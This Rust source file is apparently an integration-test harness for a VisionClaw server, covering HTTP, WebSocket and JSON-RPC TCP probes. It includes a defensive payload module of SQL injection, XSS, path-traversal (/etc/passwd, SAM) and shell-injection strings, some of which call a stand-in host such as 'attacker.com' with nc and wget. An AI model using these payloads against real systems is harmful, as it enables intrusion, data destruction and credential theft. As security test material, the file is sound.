//! Network-level integration probes against a **running** VisionClaw server.
//!
//! This crate replaces `tests/integration/*.py` (five files, ~1,630 lines of
//! `pytest` + `requests` + `websocket-client` + a `docker exec ... python -c
//! "import torch"` CUDA check). Everything here talks to the server over the
//! wire — HTTP, WebSocket and the line-delimited JSON-RPC TCP port — so nothing
//! links against `visionclaw-server` itself and the suite compiles in seconds.
//!
//! # The liveness gate
//!
//! Every probe is gated on [`Harness::probe`]. A probe **skips cleanly** (passes,
//! printing a `SKIP:` line) when either:
//!
//! * `VISIONCLAW_URL` is unset — the default state, so `cargo test` on a
//!   developer machine or in CI never fails for want of a server; or
//! * `VISIONCLAW_URL` is set but the health endpoint is unreachable.
//!
//! ```sh
//! VISIONCLAW_URL=http://localhost:9501 cargo test -p visionclaw-integration-tests
//! cargo test -p visionclaw-integration-tests -- --ignored   # + the slow probes
//! ```
//!
//! | Variable | Default | Purpose |
//! |---|---|---|
//! | `VISIONCLAW_URL` | *(unset ⇒ skip all)* | HTTP base, e.g. `http://localhost:9501` |
//! | `VISIONCLAW_WS_URL` | `ws://<host>:3002` | WebSocket bridge |
//! | `VISIONCLAW_TCP_ADDR` | `<host>:9500` | line-delimited JSON-RPC port |

use std::time::Duration;

use serde_json::{json, Value};
use tokio::io::{AsyncBufReadExt, AsyncWriteExt, BufReader};
use tokio::net::TcpStream;

/// How long a probe waits on any single request before giving up.
pub const REQUEST_TIMEOUT: Duration = Duration::from_secs(5);

/// How long the initial reachability check is given.
const PROBE_TIMEOUT: Duration = Duration::from_secs(3);

/// Resolved endpoints plus a shared HTTP client, handed to every probe.
#[derive(Debug, Clone)]
pub struct Harness {
    /// HTTP base URL, no trailing slash.
    pub base_url: String,
    /// WebSocket bridge URL.
    pub ws_url: String,
    /// `host:port` of the line-delimited JSON-RPC TCP listener.
    pub tcp_addr: String,
    client: reqwest::Client,
}

impl Harness {
    /// Resolve the endpoints and confirm the server answers, or return `None`.
    ///
    /// Returning `None` is the *skip* path: the caller returns immediately and
    /// the test is reported as passing. This is deliberate — an integration
    /// suite that hard-fails without its subject under test is noise, not signal.
    pub async fn probe() -> Option<Self> {
        let base_url = match std::env::var("VISIONCLAW_URL") {
            Ok(url) if !url.trim().is_empty() => url.trim_end_matches('/').to_string(),
            _ => {
                eprintln!("SKIP: VISIONCLAW_URL is not set — no server to probe.");
                return None;
            }
        };

        let host = host_of(&base_url);
        let ws_url =
            std::env::var("VISIONCLAW_WS_URL").unwrap_or_else(|_| format!("ws://{host}:3002"));
        let tcp_addr =
            std::env::var("VISIONCLAW_TCP_ADDR").unwrap_or_else(|_| format!("{host}:9500"));

        let client = reqwest::Client::builder()
            .timeout(REQUEST_TIMEOUT)
            .build()
            .ok()?;

        let health = format!("{base_url}/health");
        match tokio::time::timeout(PROBE_TIMEOUT, client.get(&health).send()).await {
            Ok(Ok(_)) => Some(Self {
                base_url,
                ws_url,
                tcp_addr,
                client,
            }),
            _ => {
                eprintln!("SKIP: {health} is unreachable — server not running.");
                None
            }
        }
    }

    /// The shared HTTP client, pre-configured with [`REQUEST_TIMEOUT`].
    pub fn http(&self) -> &reqwest::Client {
        &self.client
    }

    /// Absolute URL for a server-relative path such as `/api/data`.
    pub fn url(&self, path: &str) -> String {
        format!("{}{}", self.base_url, path)
    }

    /// `GET <path>`, returning `None` if the request could not be completed.
    pub async fn get(&self, path: &str) -> Option<reqwest::Response> {
        self.client.get(self.url(path)).send().await.ok()
    }

    /// `POST <path>` with a JSON body, returning `None` on transport failure.
    pub async fn post_json(&self, path: &str, body: &Value) -> Option<reqwest::Response> {
        self.client
            .post(self.url(path))
            .json(body)
            .send()
            .await
            .ok()
    }

    /// Open a JSON-RPC TCP probe against [`Self::tcp_addr`].
    pub async fn tcp(&self) -> Option<TcpProbe> {
        TcpProbe::connect(&self.tcp_addr).await
    }
}

/// Split the host out of an `http(s)://host:port` base URL.
fn host_of(base_url: &str) -> String {
    base_url
        .split("://")
        .nth(1)
        .unwrap_or(base_url)
        .split('/')
        .next()
        .unwrap_or("localhost")
        .split(':')
        .next()
        .unwrap_or("localhost")
        .to_string()
}

/// A client for the line-delimited JSON-RPC TCP listener.
///
/// The wire format is one JSON object per line in each direction — the same
/// contract the Python `TCPTestClient` spoke, minus its 1 KiB read loop.
pub struct TcpProbe {
    reader: BufReader<TcpStream>,
    /// `true` until a send or receive fails, mirroring the old `connected` flag.
    pub connected: bool,
}

impl TcpProbe {
    /// Connect to `addr`, or return `None` if the listener refused us.
    pub async fn connect(addr: &str) -> Option<Self> {
        let stream = tokio::time::timeout(REQUEST_TIMEOUT, TcpStream::connect(addr))
            .await
            .ok()?
            .ok()?;
        Some(Self {
            reader: BufReader::new(stream),
            connected: true,
        })
    }

    /// Send one JSON-RPC request and read exactly one response line.
    ///
    /// Marks the probe disconnected and yields `None` on any I/O or parse
    /// failure, so a caller can assert on both the payload and liveness.
    pub async fn request(&mut self, request: &Value) -> Option<Value> {
        if !self.connected {
            return None;
        }
        let outcome = self.request_inner(request).await;
        if outcome.is_none() {
            self.connected = false;
        }
        outcome
    }

    async fn request_inner(&mut self, request: &Value) -> Option<Value> {
        let mut line = serde_json::to_vec(request).ok()?;
        line.push(b'\n');

        let write = async {
            self.reader.get_mut().write_all(&line).await.ok()?;
            self.reader.get_mut().flush().await.ok()
        };
        tokio::time::timeout(REQUEST_TIMEOUT, write).await.ok()??;

        let mut response = String::new();
        let read = self.reader.read_line(&mut response);
        let bytes = tokio::time::timeout(REQUEST_TIMEOUT, read)
            .await
            .ok()?
            .ok()?;
        if bytes == 0 {
            return None;
        }
        serde_json::from_str(response.trim()).ok()
    }

    /// A `ping` request carrying `id`, the workhorse of the persistence probes.
    pub async fn ping(&mut self, id: Value) -> Option<Value> {
        self.request(&json!({
            "jsonrpc": "2.0",
            "id": id,
            "method": "ping",
            "params": {},
        }))
        .await
    }
}

/// Payload corpora shared by the security probes.
pub mod payloads {
    /// SQL injection attempts; every one must be rejected.
    pub const SQL: &[&str] = &[
        "'; DROP TABLE users; --",
        "1' OR '1'='1",
        "admin'--",
        "' UNION SELECT * FROM passwords--",
        "1; DELETE FROM data WHERE '1'='1",
    ];

    /// Cross-site scripting attempts; a 200 response must not echo them back.
    pub const XSS: &[&str] = &[
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "javascript:alert('XSS')",
        "<iframe src='javascript:alert(1)'></iframe>",
        "'><script>alert(String.fromCharCode(88,83,83))</script>",
    ];

    /// Shell metacharacter injection attempts; every one must be rejected.
    pub const COMMAND: &[&str] = &[
        "; cat /etc/passwd",
        "| nc attacker.com 1234",
        "`rm -rf /`",
        "$( wget attacker.com/malware.sh )",
        "& ping -c 10 attacker.com &",
    ];

    /// Path traversal attempts, including the percent-encoded form.
    pub const PATH_TRAVERSAL: &[&str] = &[
        "../../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "/var/www/../../etc/shadow",
        "....//....//etc/hosts",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    ];

    /// Strings that must never appear in a publicly readable response body.
    pub const SECRET_MARKERS: &[&str] = &[
        "password",
        "secret",
        "api_key",
        "private_key",
        "token",
        "database_url",
        "aws_secret",
    ];
}

/// Bind a [`Harness`], or return from the test if there is no live server.
///
/// ```ignore
/// #[tokio::test]
/// async fn my_probe() {
///     let h = require_server!();
///     // ...
/// }
/// ```
#[macro_export]
macro_rules! require_server {
    () => {
        match $crate::Harness::probe().await {
            Some(harness) => harness,
            None => return,
        }
    };
}

#[cfg(test)]
mod tests {
    use super::host_of;

    #[test]
    fn host_of_extracts_the_hostname() {
        assert_eq!(host_of("http://localhost:9501"), "localhost");
        assert_eq!(
            host_of("https://visionclaw.internal:443/api"),
            "visionclaw.internal"
        );
        assert_eq!(host_of("http://10.0.0.4"), "10.0.0.4");
    }

    #[test]
    fn host_of_survives_a_malformed_base_url() {
        assert_eq!(host_of("localhost:9501"), "localhost");
        assert_eq!(host_of(""), "");
    }
}
